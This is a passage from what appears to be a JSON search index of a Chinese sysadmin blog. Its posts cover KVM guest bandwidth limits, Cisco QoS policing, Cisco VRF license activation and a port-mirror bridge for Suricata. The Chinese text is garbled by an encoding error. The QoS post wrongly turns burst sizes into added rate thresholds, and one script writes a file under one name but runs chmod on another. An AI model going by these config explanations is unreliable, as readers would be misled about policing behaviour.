class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u0026lt;interface \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;bridge\u0026#39;\u003c/span\u003e\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;mac \u003cspan class=\"nv\"\u003eaddress\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;52:54:00:db:4c:5f\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;\u003cspan class=\"nb\"\u003esource\u003c/span\u003e \u003cspan class=\"nv\"\u003ebridge\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;br0.141\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;bandwidth\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;inbound \u003cspan class=\"nv\"\u003eaverage\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003epeak\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eburst\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u0026lt;outbound \u003cspan class=\"nv\"\u003eaverage\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003epeak\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e \u003cspan class=\"nv\"\u003eburst\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;1250\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;/bandwidth\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u0026lt;model \u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;virtio\u0026#39;\u003c/span\u003e/\u0026gt;\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„é™é€Ÿçš„å•ä½ï¼šæ˜¯kilobyte per second\u003c/p\u003e\n\u003cp\u003eé‚£ä¹ˆï¼š\u003c/p\u003e\n\u003cp\u003e1250 kilobyte per second,  KB/s  = 10 Mbps = 1.25 MB/s\u003c/p\u003e\n\u003cp\u003e10 Mbpså°±æ˜¯é€šå¸¸æ„ä¹‰ä¸Šçš„ç½‘é€Ÿï¼Œ/8=1.25 MB/sï¼Œå°±æ˜¯æœºå™¨ä¸Šç”¨ä¸‹è½½è½¯ä»¶æ¯”å¦‚è¿…é›·ä¸‹è½½ï¼Œçœ‹åˆ°çš„é€Ÿåº¦ï¼ˆ1.25 MB/sï¼‰ã€‚\u003c/p\u003e","title":"KVMçš„è™šæœºå¦‚ä½•é™é€Ÿ"},{"content":"è¯‰æ±‚å¾ˆç®€å•ï¼Œå¯¹å®¢æˆ·é™é€Ÿï¼Œé‚£ä¹ˆéº»çƒ¦å°±å¾ˆå¤šï¼Œæ€ä¹ˆé™ï¼Ÿ\nå…ˆæ™®åŠä¸€ä¸‹Ciscoçš„qosçŸ¥è¯†\nå•é€Ÿå•æ¡¶ï¼š å•é€Ÿå•æ¡¶æ¨¡å¼ä¸å…è®¸æµé‡çªå‘ï¼Œå½“ç”¨æˆ·çš„æµé‡é€Ÿç‡å°äºé…ç½®çš„CIRæ—¶ï¼ŒæŠ¥æ–‡è¢«è®¤ä¸ºæ˜¯conformï¼›å½“ç”¨æˆ·çš„æµé‡å¤§äºCIRæ—¶ç›´æ¥è¢«è®¤ä¸ºæ˜¯exceed(æ€ç§‘exceedåä¸ºviolate)ã€‚\n(å›¾ä¸­Tcä»£è¡¨æ¡¶é‡Œä»¤ç‰Œçš„æ•°é‡ï¼ŒCBSä»£è¡¨ä»¤ç‰Œæ¡¶çš„å®¹é‡å³Bc)\nå¦‚æœåªé…ç½®CIRï¼Œä¸æŒ‡å®šBcï¼Œé‚£ä¹ˆé»˜è®¤Bcç­‰äº1500bytesæˆ–è€… CIRæ•°å€¼ / 32 class 100 police 8000 conform-action transmit exceed-action drop class 200 police cir 8000 conform-action transmit exceed-action drop class 300 police 8000 1500 conform-action transmit exceed-action drop class 400 police cir 8000 bc 1500 conform-action transmit exceed-action drop å•é€ŸåŒæ¡¶ï¼š æ”¯æŒçªå‘æµé‡ï¼Œç”¨æˆ·çš„æµé‡ä¼šå‡ºç°ä¸‰ç§ç»“æœï¼š\n(å›¾ä¸­Tcã€Teä»£è¡¨æ¡¶é‡Œä»¤ç‰Œçš„æ•°é‡ï¼ŒCBSï¼ŒEBSä»£è¡¨ä»¤ç‰Œæ¡¶çš„å®¹é‡å³Bcã€Be)\nå°äºæˆ–ç­‰äºCIRï¼ˆä¹Ÿå°±æ˜¯ç¬¦åˆCIRï¼‰ ï¼ˆconformï¼‰ å¤§äºCIRå¹¶å°äºæˆ–ç­‰äºCIRä¸Beä¹‹å’Œï¼ˆä¹Ÿå°±æ˜¯ç¬¦åˆä¸¤ä¸ªæ¡¶ä»¤ç‰Œä¹‹å’Œï¼‰ï¼ˆexceedï¼‰ è¶…è¿‡CIRä¸Beä¹‹å’Œï¼ˆä¹Ÿå°±æ˜¯è¶…è¿‡ä¸¤ä¸ªæ¡¶ä»¤ç‰Œä¹‹å’Œï¼‰ï¼ˆviolateï¼‰\nå¦‚æœåªé…ç½®CIRã€Bcï¼Œä¸æŒ‡å®šBeï¼Œé‚£ä¹ˆé»˜è®¤Beç­‰äº1500bytesæˆ–è€…CIRæ•°å€¼ / 32ã€‚ class 500 police 8000 1000 conform-action transmit exceed-action set-prec-transmit 1 violate-action drop class 600 police 8000 1000 1300 conform-action transmit exceed-action set-prec-transmit 1 violate-action drop class 700 police cir 8000 bc 1000 be 1300 conform-action transmit exceed-action set-prec-transmit 1 violate-action drop åŒé€ŸåŒæ¡¶ï¼š (å›¾ä¸­Tcã€Tpä»£è¡¨æ¡¶é‡Œä»¤ç‰Œçš„æ•°é‡ï¼ŒCBSï¼ŒPBSä»£è¡¨ä»¤ç‰Œæ¡¶çš„å®¹é‡å³Bcã€Be)\nclass 800 police cir 8000 bc 1000 pir 8000 be 1200 conform-action transmit exceed-action transmit violate-action drop å¥½ï¼Œç½—å—¦äº†è¿™ä¹ˆå¤šã€‚æ³¨æ„ï¼Œæœ‰å¯èƒ½Ciscoçš„äº¤æ¢æœºä¸æ”¯æŒæœ€å¤æ‚çš„1rateï¼Œthree colorï¼Œæ‰€ä»¥ä½ å°±å¾—æ›´æ¢å¦å¤–ä¸¤ç§æ–¹å¼äº†ã€‚\nå®æˆ˜æ¥ä¸€ä¸‹ï¼š\npolicy-map LIMIT-50mbit class class-default police cir 50000000 bc 5000000 be 15000000 conform-action transmit exceed-action set-prec-transmit 3 violate-action set-prec-transmit 2 cirä¸ºæ‰¿è¯ºçš„å¸¦å®½é€Ÿç‡ï¼Œå³éœ€è¦ä¿è¯çš„å¸¦å®½é€Ÿç‡ï¼Œå•ä½ä¸ºbpsï¼›\nbcä¸ºæ™®é€šçªå‘ï¼Œå•ä½ä¸ºbytesï¼›\nbeä¸ºæœ€é«˜çªå‘ï¼Œå•ä½ä¸ºbytesï¼›\nset-prec-transmitï¼Œè¡¨ç¤ºè®¾ç½®IPä¼˜å…ˆçº§å¹¶è½¬å‘æ•°æ®åŒ…ï¼›\næ³¨æ„cirå’Œbcã€beçš„å•ä½æ˜¯ä¸åŒçš„ï¼Œbcå’Œbeéœ€è¦Ã—8ï¼Œç®€å•ç®—å°±æ˜¯Ã—10ï¼›\nä¸Šé¢æ•´ä½“å‘½ä»¤è§£é‡Šä¸ºï¼šæ‰¿è¯ºå¸¦å®½50Mbpsï¼Œæ™®é€šçªå‘ä¸º5Mbytesï¼Œæœ€é«˜çªå‘ä¸º15Mbytesã€‚å½“é€Ÿç‡å°äº100Mbpsï¼ˆ50+50ï¼‰æ˜¯è½¬å‘æ•°æ®åŒ…ï¼Œå½“è¶…è¿‡100Mbpså°äº200Mbpsï¼ˆ50+150ï¼‰æ˜¯é‡å†™IPä¼˜å…ˆçº§ä¸º3å¹¶è½¬å‘æ•°æ®åŒ…ï¼Œå½“è¶…è¿‡200Mbpsæ˜¯é‡å†™IPä¼˜å…ˆçº§ä¸º2å¹¶è½¬å‘æ•°æ®åŒ…ã€‚\nå¯ä»¥å˜ç§ä¸€ä¸‹ï¼Œè¶…äº†100å…†ç›´æ¥drop\npolice cir 50000000 bc 5000000 be 15000000 conform-action transmit exceed-action drop æœ€ååœ¨ç«¯å£åº”ç”¨ä¸€ä¸‹ç­–ç•¥å³å¯ï¼š\ninterface GigabitEthernet1/0/22 description uplink: uplink [50Mbps-200Mbps] switchport access vlan 111 switchport mode access storm-control broadcast level 1.00 storm-control multicast level 5.00 storm-control action shutdown spanning-tree portfast spanning-tree bpdufilter enable spanning-tree bpduguard enable service-policy input LIMIT-50mbit service-policy output LIMIT-50mbit ! ","permalink":"https://rendoumi.com/posts/20240124-cisco_qos/","summary":"\u003cp\u003eè¯‰æ±‚å¾ˆç®€å•ï¼Œå¯¹å®¢æˆ·é™é€Ÿï¼Œé‚£ä¹ˆéº»çƒ¦å°±å¾ˆå¤šï¼Œæ€ä¹ˆé™ï¼Ÿ\u003c/p\u003e\n\u003cp\u003eå…ˆæ™®åŠä¸€ä¸‹Ciscoçš„qosçŸ¥è¯†\u003c/p\u003e\n\u003ch5 id=\"å•é€Ÿå•æ¡¶\"\u003eå•é€Ÿå•æ¡¶ï¼š\u003c/h5\u003e\n\u003cp\u003eå•é€Ÿå•æ¡¶æ¨¡å¼ä¸å…è®¸æµé‡çªå‘ï¼Œå½“ç”¨æˆ·çš„æµé‡é€Ÿç‡å°äºé…ç½®çš„CIRæ—¶ï¼ŒæŠ¥æ–‡è¢«è®¤ä¸ºæ˜¯conformï¼›å½“ç”¨æˆ·çš„æµé‡å¤§äºCIRæ—¶ç›´æ¥è¢«è®¤ä¸ºæ˜¯exceed(æ€ç§‘exceedåä¸ºviolate)ã€‚\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240124161128865\" loading=\"lazy\" src=\"/posts/20240124-cisco_qos/image-20240124161128865.png\"\u003e\u003c/p\u003e\n\u003cp\u003e(å›¾ä¸­Tcä»£è¡¨æ¡¶é‡Œä»¤ç‰Œçš„æ•°é‡ï¼ŒCBSä»£è¡¨ä»¤ç‰Œæ¡¶çš„å®¹é‡å³Bc)\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå¦‚æœåªé…ç½®CIRï¼Œä¸æŒ‡å®šBcï¼Œé‚£ä¹ˆé»˜è®¤Bcç­‰äº1500bytesæˆ–è€… CIRæ•°å€¼ / \u003cspan class=\"m\"\u003e32\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police \u003cspan class=\"m\"\u003e8000\u003c/span\u003e conform-action transmit  exceed-action drop \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police cir \u003cspan class=\"m\"\u003e8000\u003c/span\u003e conform-action transmit  exceed-action drop \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e300\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police \u003cspan class=\"m\"\u003e8000\u003c/span\u003e \u003cspan class=\"m\"\u003e1500\u003c/span\u003e conform-action transmit  exceed-action drop \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e400\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police cir \u003cspan class=\"m\"\u003e8000\u003c/span\u003e bc \u003cspan class=\"m\"\u003e1500\u003c/span\u003e conform-action transmit  exceed-action drop\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"å•é€ŸåŒæ¡¶\"\u003eå•é€ŸåŒæ¡¶ï¼š\u003c/h5\u003e\n\u003cp\u003eæ”¯æŒçªå‘æµé‡ï¼Œç”¨æˆ·çš„æµé‡ä¼šå‡ºç°ä¸‰ç§ç»“æœï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240124161359401\" loading=\"lazy\" src=\"/posts/20240124-cisco_qos/image-20240124161359401.png\"\u003e\u003c/p\u003e\n\u003cp\u003e(å›¾ä¸­Tcã€Teä»£è¡¨æ¡¶é‡Œä»¤ç‰Œçš„æ•°é‡ï¼ŒCBSï¼ŒEBSä»£è¡¨ä»¤ç‰Œæ¡¶çš„å®¹é‡å³Bcã€Be)\u003c/p\u003e\n\u003cp\u003eå°äºæˆ–ç­‰äºCIRï¼ˆä¹Ÿå°±æ˜¯ç¬¦åˆCIRï¼‰ ï¼ˆconformï¼‰\nå¤§äºCIRå¹¶å°äºæˆ–ç­‰äºCIRä¸Beä¹‹å’Œï¼ˆä¹Ÿå°±æ˜¯ç¬¦åˆä¸¤ä¸ªæ¡¶ä»¤ç‰Œä¹‹å’Œï¼‰ï¼ˆexceedï¼‰\nè¶…è¿‡CIRä¸Beä¹‹å’Œï¼ˆä¹Ÿå°±æ˜¯è¶…è¿‡ä¸¤ä¸ªæ¡¶ä»¤ç‰Œä¹‹å’Œï¼‰ï¼ˆviolateï¼‰\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eå¦‚æœåªé…ç½®CIRã€Bcï¼Œä¸æŒ‡å®šBeï¼Œé‚£ä¹ˆé»˜è®¤Beç­‰äº1500bytesæˆ–è€…CIRæ•°å€¼ / 32ã€‚\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e500\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police \u003cspan class=\"m\"\u003e8000\u003c/span\u003e \u003cspan class=\"m\"\u003e1000\u003c/span\u003e conform-action transmit  exceed-action set-prec-transmit \u003cspan class=\"m\"\u003e1\u003c/span\u003e violate-action drop \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e600\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police \u003cspan class=\"m\"\u003e8000\u003c/span\u003e \u003cspan class=\"m\"\u003e1000\u003c/span\u003e \u003cspan class=\"m\"\u003e1300\u003c/span\u003e conform-action transmit  exceed-action set-prec-transmit \u003cspan class=\"m\"\u003e1\u003c/span\u003e violate-action drop \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e class \u003cspan class=\"m\"\u003e700\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  police cir \u003cspan class=\"m\"\u003e8000\u003c/span\u003e bc \u003cspan class=\"m\"\u003e1000\u003c/span\u003e be \u003cspan class=\"m\"\u003e1300\u003c/span\u003e conform-action transmit  exceed-action set-prec-transmit \u003cspan class=\"m\"\u003e1\u003c/span\u003e violate-action drop\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"åŒé€ŸåŒæ¡¶\"\u003eåŒé€ŸåŒæ¡¶ï¼š\u003c/h5\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240124161442705\" loading=\"lazy\" src=\"/posts/20240124-cisco_qos/image-20240124161442705.png\"\u003e\u003c/p\u003e","title":"Ciscoè·¯ç”±å™¨ä¸Šqosçš„è®¾ç½®"},{"content":"ä½œä¸ºä¸€ä¸ªè¿ç»´ï¼Œç°åœ¨æèµ·äº†Cisoçš„BGPç”Ÿæ„\nåœ¨Cisco3650ä¸Šå®šä¹‰VRFï¼Œç»“æœæŠ¥é”™ï¼Œä¸€å¤´é›¾æ°´å•Šï¼Œè€Œä¸”å¯¹Ciscoä¹Ÿä¸ç†Ÿæ‚‰å•Šã€‚\n#vrf definition mgmt % Feature is not supported æ²¡åŠæ³•æœGoogleå•Šï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\nsh license right-to-use license right-to-use activate ipservices all reload license right-to-use activate ipservices all acceptEULA reload æœ€åæ˜¾ç¤ºipserviceså’Œlanbaseéƒ½æœ‰å°±è¡Œäº†\n#sh license right-to-use Slot# License name Type Count Period left ---------------------------------------------------------- 1 ipservices permanent N/A Lifetime 1 lanbase permanent N/A Lifetime ","permalink":"https://rendoumi.com/posts/20240124-vrf/","summary":"\u003cp\u003eä½œä¸ºä¸€ä¸ªè¿ç»´ï¼Œç°åœ¨æèµ·äº†Cisoçš„BGPç”Ÿæ„\u003c/p\u003e\n\u003cp\u003eåœ¨Cisco3650ä¸Šå®šä¹‰VRFï¼Œç»“æœæŠ¥é”™ï¼Œä¸€å¤´é›¾æ°´å•Šï¼Œè€Œä¸”å¯¹Ciscoä¹Ÿä¸ç†Ÿæ‚‰å•Šã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#vrf definition mgmt\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e% Feature is not supported\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ²¡åŠæ³•æœGoogleå•Šï¼Œè§£å†³æ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esh license right-to-use  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elicense right-to-use activate ipservices all  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereload  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elicense right-to-use activate ipservices all acceptEULA  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ereload  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæœ€åæ˜¾ç¤ºipserviceså’Œlanbaseéƒ½æœ‰å°±è¡Œäº†\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#sh license right-to-use\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e Slot#  License name   Type     Count   Period left \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e----------------------------------------------------------\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e      ipservices   permanent     N/A   Lifetime\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e      lanbase      permanent     N/A   Lifetime\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Cisco vrfé”™è¯¯ä¹‹the feature does not supported"},{"content":"ç”±äºå¤§æBGPçº¿è·¯ï¼Œæ‰€ä»¥åœ¨Ciscoè·¯ç”±å™¨ä¸ŠMirroräº†å…¥å£çš„æµé‡åˆ°å¦å¤–ä¸€ä¸ªç«¯å£ï¼Œä¾›suricataåˆ†æç”¨ã€‚\nåœ¨Mirrorç›´é€škvmè™šæœºè¿‡ç¨‹ä¸­é‡åˆ°ä»¥ä¸‹é—®é¢˜ï¼š\nMirrorçš„å£æ˜¯Teå£ï¼Œ10Gçš„æµé‡ï¼Œåœ¨å®¿ä¸»æœºä¸Štcpdumpå¯ä»¥çœ‹åˆ°æ‰€æœ‰æµé‡ï¼Œä½†æ˜¯åœ¨kvmä¸Šåˆ™æ–­æ–­ç»­ç»­ï¼Œæµé‡ä¸¢å¤±ä¸€éƒ¨åˆ†ï¼ŒåŸå› å¾ˆç®€å•ï¼š\næµé‡çš„èšåˆå’Œè½¬å‘æœªé…ç½®å¥½ï¼Œä¸¤æ¡å‘½ä»¤è§£å†³\nbrctl setageing br2 0 brctl setfd br2 0 ä½†æ˜¯ï¼Œå¦‚ä½•åœ¨å®¿ä¸»æœºå¯åŠ¨çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œè¿™ä¸¤å¥å‘¢ï¼Ÿç®€å•ï¼Œå¦‚æœç³»ç»Ÿæ˜¯CentOS\ncat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/sbin/ifup-local #!/bin/bash brctl setageing br2 0 brctl setfd br2 0 EOF chmod 755 /sbin/ifup-local å¦‚æœç³»ç»Ÿæ˜¯Ubuntu\ncd /etc/network/if-up.d cat \u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;br3-mirror #!/bin/bash if [ \u0026#34;$IFACE\u0026#34; = br2 ]; then brctl setageing br2 0 brctl setfd br2 0 fi EOF chmod +x br2-mirror åœ¨å®¿ä¸»æœºä¸Šé—®é¢˜è§£å†³äº†ï¼Œåœ¨kvmè™šæœºä¸Šåˆé‡åˆ°é—®é¢˜ï¼ŒUbuntuï¼Œå¦‚æœè®©ä¸€ä¸ªç½‘å£å¯åŠ¨ä½†æ²¡æœ‰åœ°å€å‘¢ï¼Ÿ\nvi /etc/network/interfaces auto ens7 iface ens7 inet manual mtu 1464 up ifconfig ens7 up æ³¨æ„ä¸Šé¢çš„ï¼Œens7å°±æ˜¯mirrorè¿‡æ¥çš„ç½‘å£ï¼Œmtuæ˜¯å› ä¸ºåœ¨ciscoåšmirrorçš„æ—¶å€™æŒ‡å®šäº†å›ºå®šçš„mtu 1464.\nbrctlå‘½ä»¤çš„ç”¨æ³•å¯ä»¥å‚è§ä»¥ä¸‹é“¾æ¥ï¼š\nhttps://www.thegeekstuff.com/2017/06/brctl-bridge/\nover.\n","permalink":"https://rendoumi.com/posts/20240124-kvm_mirror/","summary":"\u003cp\u003eç”±äºå¤§æBGPçº¿è·¯ï¼Œæ‰€ä»¥åœ¨Ciscoè·¯ç”±å™¨ä¸ŠMirroräº†å…¥å£çš„æµé‡åˆ°å¦å¤–ä¸€ä¸ªç«¯å£ï¼Œä¾›\u003ccode\u003esuricata\u003c/code\u003eåˆ†æç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eåœ¨Mirrorç›´é€škvmè™šæœºè¿‡ç¨‹ä¸­é‡åˆ°ä»¥ä¸‹é—®é¢˜ï¼š\u003c/p\u003e\n\u003cp\u003eMirrorçš„å£æ˜¯Teå£ï¼Œ10Gçš„æµé‡ï¼Œåœ¨å®¿ä¸»æœºä¸Štcpdumpå¯ä»¥çœ‹åˆ°æ‰€æœ‰æµé‡ï¼Œä½†æ˜¯åœ¨kvmä¸Šåˆ™æ–­æ–­ç»­ç»­ï¼Œæµé‡ä¸¢å¤±ä¸€éƒ¨åˆ†ï¼ŒåŸå› å¾ˆç®€å•ï¼š\u003c/p\u003e\n\u003cp\u003eæµé‡çš„èšåˆå’Œè½¬å‘æœªé…ç½®å¥½ï¼Œä¸¤æ¡å‘½ä»¤è§£å†³\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebrctl setageing br2 \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ebrctl setfd br2 \u003cspan class=\"m\"\u003e0\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eä½†æ˜¯ï¼Œå¦‚ä½•åœ¨å®¿ä¸»æœºå¯åŠ¨çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œè¿™ä¸¤å¥å‘¢ï¼Ÿç®€å•ï¼Œå¦‚æœç³»ç»Ÿæ˜¯CentOS\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;/sbin/ifup-local  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebrctl setageing br2 0  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003ebrctl setfd br2 0  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003echmod \u003cspan class=\"m\"\u003e755\u003c/span\u003e /sbin/ifup-local  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå¦‚æœç³»ç»Ÿæ˜¯Ubuntu\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /etc/network/if-up.d  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt;EOF\u0026gt;\u0026gt;br3-mirror  \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eif [ 